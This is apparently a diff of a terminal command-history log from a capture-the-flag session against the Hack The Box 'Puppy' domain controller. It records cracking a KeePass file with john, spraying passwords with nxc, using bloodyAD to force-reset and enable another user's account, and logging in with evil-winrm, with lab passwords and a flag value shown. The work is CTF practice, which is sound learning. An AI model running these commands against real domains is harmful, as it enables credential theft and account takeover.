@@ -846,3 +846,421 @@
 [2026-01-28 17:08:33] [pane=%1] [CMD_START] searchsploit keepass 2.7
 [2026-01-28 17:12:31] [pane=%0] [CMD_START] ll
 [2026-01-28 17:12:51] [pane=%0] [CMD_START] 7z x recovery.kdbx
+[2026-01-31 12:35:36] [pane=%0] [CMD_START] ll
+[2026-01-31 12:49:15] [pane=%0] [CMD_START] cat keepass.hash
+[2026-01-31 12:49:16] [pane=%0] [CMD_START] ll
+[2026-01-31 12:49:19] [pane=%0] [CMD_START] rm keepass.hash
+[2026-01-31 12:49:20] [pane=%0] [CMD_START] ll
+[2026-01-31 12:51:05] [pane=%0] [CMD_START] keepass2john 
+[2026-01-31 12:51:25] [pane=%0] [CMD_START] john --version
+[2026-01-31 12:51:31] [pane=%0] [CMD_START] john --help
+[2026-01-31 12:53:25] [pane=%0] [CMD_START] keepass2john recovery.kdbx
+[2026-01-31 12:54:29] [pane=%0] [CMD_START] sha1sum keepass2john
+[2026-01-31 12:54:57] [pane=%0] [CMD_START] which keepass2john
+[2026-01-31 12:56:22] [pane=%0] [CMD_START] sha1sum /usr/sbin/keepass2john
+[2026-01-31 12:58:48] [pane=%0] [CMD_START] echo "a205adc9a4657f0a02922bf7ebc5cd2cb61ab777" | sha1sum
+[2026-01-31 13:01:32] [pane=%0] [CMD_START] keepass2john --version
+[2026-01-31 13:05:46] [pane=%0] [CMD_START] john -h recovery.kdbx
+[2026-01-31 13:09:16] [pane=%0] [CMD_START] keepass2john passwords.kdbx > passwords.kdbx.hash
+[2026-01-31 13:09:28] [pane=%0] [CMD_START] keepass2john recovery.kdbx > passwords.kdbx.hash
+[2026-01-31 13:13:20] [pane=%0] [CMD_START] file recovery.kdbx
+[2026-01-31 13:16:27] [pane=%0] [CMD_START] which keepass2john
+[2026-01-31 13:16:59] [pane=%0] [CMD_START] keepass2john --version
+[2026-01-31 13:17:04] [pane=%0] [CMD_START] keepass2john --help
+[2026-01-31 13:17:16] [pane=%0] [CMD_START] john --help
+[2026-01-31 13:17:48] [pane=%0] [CMD_START] ll
+[2026-01-31 13:18:56] [pane=%1] [CMD_START] bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
+[2026-01-31 13:22:01] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-31 13:22:18] [pane=%1] [CMD_START] bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
+[2026-01-31 13:22:24] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-31 13:22:44] [pane=%1] [CMD_START] dir
+[2026-01-31 13:22:46] [pane=%1] [CMD_START] ll
+[2026-01-31 13:23:06] [pane=%1] [CMD_START] keepass2john recovery.kdbx
+[2026-01-31 13:25:15] [pane=%1] [CMD_START] sudo apt install -y git build-essential libssl-dev zlib1g-dev pkg-config libgmp-dev libpcap-dev libbz2-dev && \ git clone https://github.com/openwall/john -b bleeding-jumbo ~/john && \ cd ~/john/src && \ ./configure && make -s clean && make -sj4 && \ cd ../run && \ ./keepass2john
+[2026-01-31 13:25:42] [pane=%1] [CMD_START] keepass2john recovery.kdbx
+[2026-01-31 13:26:45] [pane=%1] [CMD_START] sudo apt install -y git build-essential libssl-dev zlib1g-dev pkg-config libgmp-dev libpcap-dev libbz2-dev && git clone https://github.com/openwall/john -b bleeding-jumbo ~/john && cd ~/john/src && ./configure && make -s clean && make -sj4 && cd ../run && ./keepass2john
+[2026-01-31 13:37:46] [pane=%1] [CMD_START] ./john -h
+[2026-01-31 13:38:53] [pane=%1] [CMD_START] keepass2john ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/recovery.kdbx
+[2026-01-31 13:39:06] [pane=%1] [CMD_START] ll
+[2026-01-31 13:40:00] [pane=%1] [CMD_START] ./keepass2john ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/recovery.kdbx
+[2026-01-31 13:41:09] [pane=%1] [CMD_START] grep 1.9.0
+[2026-01-31 13:41:32] [pane=%1] [CMD_START]  ./john | grep 1.9.0
+[2026-01-31 13:41:41] [pane=%1] [CMD_START]  john | grep 1.9.0
+[2026-01-31 13:42:07] [pane=%1] [CMD_START]  john -h | head -n 1
+[2026-01-31 13:43:31] [pane=%1] [CMD_START] -h | head -n 1
+[2026-01-31 13:43:42] [pane=%1] [CMD_START] ./john -h | head -n 1
+[2026-01-31 13:45:41] [pane=%1] [CMD_START] apt search ^john
+[2026-01-31 13:46:17] [pane=%1] [CMD_START] apt list john
+[2026-01-31 13:51:50] [pane=%1] [CMD_START] sudo apt remove john
+[2026-01-31 13:52:51] [pane=%1] [CMD_START] john
+[2026-01-31 13:53:17] [pane=%1] [CMD_START] keepass2john
+[2026-01-31 13:54:11] [pane=%1] [CMD_START] $PATH
+[2026-01-31 13:54:19] [pane=%1] [CMD_START] echo $PATH
+[2026-01-31 13:55:25] [pane=%1] [CMD_START] cd ..
+[2026-01-31 13:55:28] [pane=%1] [CMD_START] cd
+[2026-01-31 13:55:42] [pane=%1] [CMD_START] ls ~/.local/bin/
+[2026-01-31 13:57:06] [pane=%1] [CMD_START] mv ~/john/run/ ~/.local/bin/john
+[2026-01-31 13:57:11] [pane=%1] [CMD_START] john
+[2026-01-31 13:57:25] [pane=%1] [CMD_START] cd ..
+[2026-01-31 13:57:59] [pane=%1] [CMD_START] mv ~/john/run/ ~/.local/bin/john
+[2026-01-31 13:58:03] [pane=%1] [CMD_START] ls ~/.local/bin/
+[2026-01-31 13:59:16] [pane=%1] [CMD_START] mv ~local/bin/john/* ~/.local/bin/
+[2026-01-31 13:59:23] [pane=%1] [CMD_START] mv ~/local/bin/john/* ~/.local/bin/
+[2026-01-31 13:59:39] [pane=%1] [CMD_START] mv ~/.local/bin/john/* ~/.local/bin/
+[2026-01-31 14:00:13] [pane=%1] [CMD_START] john
+[2026-01-31 14:00:20] [pane=%1] [CMD_START] cd 
+[2026-01-31 14:00:52] [pane=%1] [CMD_START] ls ~/.local/bin/
+[2026-01-31 14:01:44] [pane=%1] [CMD_START] mkdir ~/src && mv ~/john ~/src
+[2026-01-31 14:01:48] [pane=%1] [CMD_START] john
+[2026-01-31 14:01:59] [pane=%1] [CMD_START] ls ~/.local/bin/
+[2026-01-31 14:02:41] [pane=%1] [CMD_START] ls ~/.local/bin/john
+[2026-01-31 14:04:06] [pane=%1] [CMD_START]  cd ~/.local/bin && mv ./john ./johntemp && mv ./johntemp/john . && rmdir ./johntemp
+[2026-01-31 14:04:09] [pane=%1] [CMD_START] ll
+[2026-01-31 14:04:10] [pane=%1] [CMD_START] ls
+[2026-01-31 14:04:17] [pane=%1] [CMD_START] cd
+[2026-01-31 14:04:19] [pane=%1] [CMD_START] john
+[2026-01-31 14:05:03] [pane=%1] [CMD_START] ll
+[2026-01-31 14:05:13] [pane=%1] [CMD_START] cd ~/.local/bin
+[2026-01-31 14:05:23] [pane=%1] [CMD_START] ll
+[2026-01-31 14:05:24] [pane=%1] [CMD_START] ls
+[2026-01-31 14:05:35] [pane=%1] [CMD_START] cd john
+[2026-01-31 14:05:46] [pane=%1] [CMD_START] jon
+[2026-01-31 14:05:48] [pane=%1] [CMD_START] john
+[2026-01-31 14:07:09] [pane=%1] [CMD_START] which john
+[2026-01-31 14:07:42] [pane=%1] [CMD_START] `which john`
+[2026-01-31 14:09:07] [pane=%1] [CMD_START] echo $HOME
+[2026-01-31 14:09:28] [pane=%1] [CMD_START] cd
+[2026-01-31 14:09:40] [pane=%1] [CMD_START] ~/.local/bin/john
+[2026-01-31 14:09:59] [pane=%1] [CMD_START] ll
+[2026-01-31 14:12:06] [pane=%1] [CMD_START] cd ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot
+[2026-01-31 14:12:43] [pane=%1] [CMD_START] `which keepass2john` ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/recovery.kdbx 
+[2026-01-31 14:12:59] [pane=%1] [CMD_START] `which keepass2john` ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/recovery.kdbx > recovery.hash
+[2026-01-31 14:13:00] [pane=%1] [CMD_START] ll
+[2026-01-31 14:13:05] [pane=%1] [CMD_START] cat recovery.hash
+[2026-01-31 14:16:52] [pane=%1] [CMD_START] which john -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-01-31 14:18:02] [pane=%1] [CMD_START] `which john` -wordlist=/usr/share/wordlists/rockyou.txt recovey.hash
+[2026-01-31 14:18:08] [pane=%1] [CMD_START] ll
+[2026-01-31 14:18:38] [pane=%1] [CMD_START] ~/.local/bin/john -wordlist=/usr/share/wordlists/rockyou.txt recovey.hash
+[2026-01-31 14:18:50] [pane=%1] [CMD_START] ~/.local/bin/john -wordlist=/usr/share/wordlists/rockyou.txt recovery.hash
+[2026-01-31 14:19:44] [pane=%1] [CMD_START] ~/.local/bin/john -wordlist=/usr/share/wordlists/rockyou.txt recovery.hash --show
+[2026-01-31 14:20:02] [pane=%1] [CMD_START] ~/.local/bin/john --show -wordlist=/usr/share/wordlists/rockyou.txt recovery.hash
+[2026-01-31 14:20:23] [pane=%1] [CMD_START] ~/.local/bin/john --show recovery.hash
+[2026-01-31 14:20:42] [pane=%1] [CMD_START] keepass2
+[2026-01-31 14:20:59] [pane=%1] [CMD_START] kpcli
+[2026-01-31 14:22:01] [pane=%0] [CMD_START] ll
+[2026-01-31 14:24:25] [pane=%0] [CMD_START] pwd
+[2026-01-31 14:25:54] [pane=%1] [CMD_START] sudo kpcli
+[2026-01-31 14:28:04] [pane=%0] [CMD_START] ll
+[2026-01-31 14:29:45] [pane=%1] [CMD_START] keepass
+[2026-01-31 14:30:01] [pane=%1] [CMD_START] sudo apt install keepass2
+[2026-01-31 14:30:18] [pane=%1] [CMD_START] keepass2
+[2026-01-31 14:35:58] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'HJKL2025!'
+[2026-01-31 14:37:53] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u ant.edwards -p 'Antman2025!'
+[2026-01-31 14:38:53] [pane=%0] [CMD_START] nxc winrm 10.129.232.75 -u ant.edwards -p 'Antman2025!'
+[2026-01-31 14:40:48] [pane=%0] [CMD_START] nxc winrm 10.129.232.75 -u adam.silver -p 'HJKL2025!'
+[2026-01-31 14:55:30] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u jamie.williams -p 'Antman2025!'
+[2026-01-31 14:55:48] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u jamie.williams -p 'JamieLove2025!'
+[2026-01-31 14:56:44] [pane=%0] [CMD_START] nxc winrm 10.129.232.75 -u jamie.williams -p 'JamieLove2025!'
+[2026-01-31 14:59:58] [pane=%0] [CMD_START] wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
+[2026-01-31 15:00:10] [pane=%0] [CMD_START] ll
+[2026-01-31 15:00:16] [pane=%0] [CMD_START] chmod +x targetedKerberoast.py
+[2026-01-31 15:02:21] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'certified.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 15:02:54] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 21:05:04] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 21:05:09] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 21:05:22] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 21:06:04] [pane=%0] [CMD_START] cat ../nmap/puppyNmapServicesVersions.txt
+[2026-01-31 21:06:37] [pane=%0] [CMD_START] cat ../nmap/puppyNmapServicesVersions.txt
+[2026-01-31 21:06:42] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-01-31 21:08:46] [pane=%0] [CMD_START] rdate -n 10.129.232.75
+[2026-01-31 21:08:51] [pane=%0] [CMD_START] sudo rdate -n 10.129.232.75
+[2026-02-01 04:09:21] [pane=%0] [CMD_START] ./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
+[2026-02-01 04:09:34] [pane=%0] [CMD_START] ll
+[2026-02-01 04:15:20] [pane=%0] [CMD_START] net rpc password "adam.silver" "Password123" -U "puppy.htb"/"ant.edwards"%"Antman2025\!" -S "DC.puppyt.htb"
+[2026-02-01 04:15:37] [pane=%0] [CMD_START] net rpc password "adam.silver" "Password123" -U "puppy.htb"/"ant.edwards"%"Antman2025\!" -S "DC.puppy.htb"
+[2026-02-01 04:24:11] [pane=%0] [CMD_START] net rpc password "adam.silver" "Password123" -U "puppy.htb"/"ant.edwards"%"Antman2025\!" -S "dc.puppy.htb"
+[2026-02-01 04:26:27] [pane=%0] [CMD_START] net rpc password "adam.silver" "Password123" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
+[2026-02-01 04:27:37] [pane=%0] [CMD_START] net rpc password "adam.silver" "Password123" -U "PUPPY.HTB"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
+[2026-02-01 04:28:42] [pane=%0] [CMD_START] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 set password 'management_svc' 'Newpassword123!'
+[2026-02-01 04:29:51] [pane=%0] [CMD_START] bloodyAD -d puppy.htb -u ant.edwared -p 'Antman2025!' --host 10.129.232.75 set password 'adam.silver' 'Newpassword123!'
+[2026-02-01 04:35:15] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 04:36:49] [pane=%0] [CMD_START] : #note successfully used bloddyAD to change adam.silver password
+[2026-02-01 04:38:54] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 04:40:23] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 04:41:36] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 04:41:41] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 04:45:30] [pane=%0] [CMD_START] cat ../nmap/puppyNmapServicesVersions.txt
+[2026-02-01 04:48:16] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 04:50:55] [pane=%0] [CMD_START] bloodyAD --help
+[2026-02-01 04:51:01] [pane=%0] [CMD_START] bloodyAD --help | enable
+[2026-02-01 04:51:10] [pane=%0] [CMD_START] bloodyAD --help | grep enable
+[2026-02-01 05:02:52] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u adam.silver -p 'Password123!' msldap enableuser -h
+[2026-02-01 05:03:31] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u adam.silver -p 'Password123!' msldap enableuser
+[2026-02-01 05:06:04] [pane=%0] [CMD_START] bloodyAD -H '10.129.232.75' -d 'puppy.htb' -u 'adam.silver' -p 'Password123!' msldap enableuser
+[2026-02-01 05:08:44] [pane=%0] [CMD_START] bloodyAD --help msldap
+[2026-02-01 05:18:42] [pane=%0] [CMD_START] sudo apt remove bloodyAD
+[2026-02-01 05:19:32] [pane=%0] [CMD_START] which bloodyAD
+[2026-02-01 05:30:11] [pane=%0] [CMD_START] bloodyAD -H '10.129.232.75' -d 'puppy.htb' -u 'adam.silver' -p 'Password123!' msldap enableuser
+[2026-02-01 05:31:49] [pane=%0] [CMD_START] bloodyAD msldap enableuser -h
+[2026-02-01 05:34:04] [pane=%0] [CMD_START] bloodyAD msldap enableuser adam.silver
+[2026-02-01 05:34:10] [pane=%0] [CMD_START] bloodyAD msldap enableuser -h
+[2026-02-01 05:34:20] [pane=%0] [CMD_START] bloodyAD msldap enableuser adam.silver
+[2026-02-01 05:34:45] [pane=%0] [CMD_START] bloodyAD msldap enableuser -h adam.silver
+[2026-02-01 05:35:13] [pane=%0] [CMD_START] bloodyAD msldap enableuser -h puppy.htb
+[2026-02-01 05:35:39] [pane=%0] [CMD_START] bloodyAD -H '10.129.232.75' -d 'puppy.htb' -u 'adam.silver' -p 'Password123!' msldap enableuser
+[2026-02-01 05:36:49] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'adam.silver'
+[2026-02-01 05:38:20] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u adam.silver -p 'Password123!' msldap enableuser -h 'adam.silver'
+[2026-02-01 05:39:00] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u adam.silver -p 'Password123!' msldap enableuser 'adam.silver@puppy.htb'
+[2026-02-01 05:40:42] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'adam.silver@puppy.htb'
+[2026-02-01 05:43:35] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'adam.silver'
+[2026-02-01 05:43:45] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-01 05:45:12] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 05:47:25] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.si
+lver -p 'Password123!'
+[2026-02-01 05:47:33] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 05:49:25] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:50:04] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:50:44] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:51:42] [pane=%0] [CMD_START] bloodyAD --ip 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:52:11] [pane=%0] [CMD_START] bloodyAD --dc-ip 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:52:20] [pane=%0] [CMD_START] bloodyAD 10.129.232.75 -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:52:40] [pane=%0] [CMD_START] bloodyAD -host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:53:11] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 05:53:30] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 05:53:44] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-01 05:53:50] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 05:54:04] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-01 06:07:35] [pane=%0] [CMD_START] : #note after finding adam.silvers password in keepass and trying to validate it in smb. it does not work. checking bloodhound connections we find ant.edwards is in senior developers which has GenericAll over adam.silver. based on bloodhound sidebar it appears that we can change adam.silver's password. after attempting, targetedKerberoast, net rpc, we had to run bloodyAD commands to change adam's password, enable his account and then login with evil-winRM.
+[2026-02-01 06:08:15] [pane=%0] [CMD_START] : #note $ bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-01 06:09:49] [pane=%0] [CMD_START] : #note $ nxc smb 10.129.232.75 -u adam.silver -p 'Password123!' SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)             
+SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Password123
+! STATUS_ACCOUNT_DISABLED
+[2026-02-01 06:10:06] [pane=%0] [CMD_START] $ bloodyAD -H 10.129.232.75 -d pup
+py.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC
+=PUPPY,DC=HTB'                                                                           
+User enabled
+[2026-02-01 06:10:27] [pane=%0] [CMD_START] $ bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'                                                                        
+User enabled
+[2026-02-01 06:10:50] [pane=%0] [CMD_START] : #note $ bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'                                                                        
+User enabled
+[2026-02-01 06:12:02] [pane=%0] [CMD_START] : #note logging in with evil-winRM and pulling the user.txt flag *Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
+b523e727d701ab8ea8596ffc7d3f1e49
+[2026-02-04 00:29:45] [pane=%0] [CMD_START] $ bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 00:29:53] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 00:30:38] [pane=%0] [CMD_START] : #note $ bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 00:30:55] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 00:32:30] [pane=%0] [CMD_START] : #note $ bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 00:32:42] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 00:32:46] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 00:37:06] [pane=%0] [CMD_START] : #note $ bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 00:37:11] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 00:38:43] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'an
+t.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 00:38:49] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 00:38:55] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 00:39:18] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 00:39:33] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 00:39:41] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 01:55:12] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 01:55:17] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 01:55:20] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 02:33:08] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 02:33:12] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 02:33:16] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 02:36:10] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 02:36:13] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 02:36:17] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 02:49:43] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 02:49:46] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 02:49:51] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 02:50:55] [pane=%1] [CMD_START] cd ../nmap
+[2026-02-04 02:50:56] [pane=%1] [CMD_START] dir
+[2026-02-04 02:50:58] [pane=%1] [CMD_START] ll
+[2026-02-04 02:51:04] [pane=%1] [CMD_START] cat puppyNmapServicesVersions.txt
+[2026-02-04 02:52:53] [pane=%1] [CMD_START] nc -nv 10.129.232.75 3260
+[2026-02-04 03:09:02] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 03:09:05] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 03:09:07] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 03:15:18] [pane=%1] [CMD_START] smbclient //10.129.232.75/ -U "adam.silver"%'Password123!' --shares
+[2026-02-04 03:15:27] [pane=%1] [CMD_START] smbclient //10.129.232.75/ -U "adam.silver"%'Password123!'
+[2026-02-04 03:16:23] [pane=%1] [CMD_START] showmount -e 10.129.232.75
+[2026-02-04 03:18:38] [pane=%1] [CMD_START] dir
+[2026-02-04 03:18:38] [pane=%1] [CMD_START] ls
+[2026-02-04 03:24:43] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'JamieLove2025!'
+[2026-02-04 03:26:59] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u steph.cooper -p 'Steve2025!'
+[2026-02-04 03:28:25] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u steph.cooper -p 'ILY2025!'
+[2026-02-04 03:29:49] [pane=%0] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 03:29:58] [pane=%0] [CMD_START] bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+[2026-02-04 03:30:05] [pane=%0] [CMD_START] bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
+[2026-02-04 03:30:11] [pane=%0] [CMD_START] evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
+[2026-02-04 03:43:46] [pane=%1] [CMD_START] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!' --users
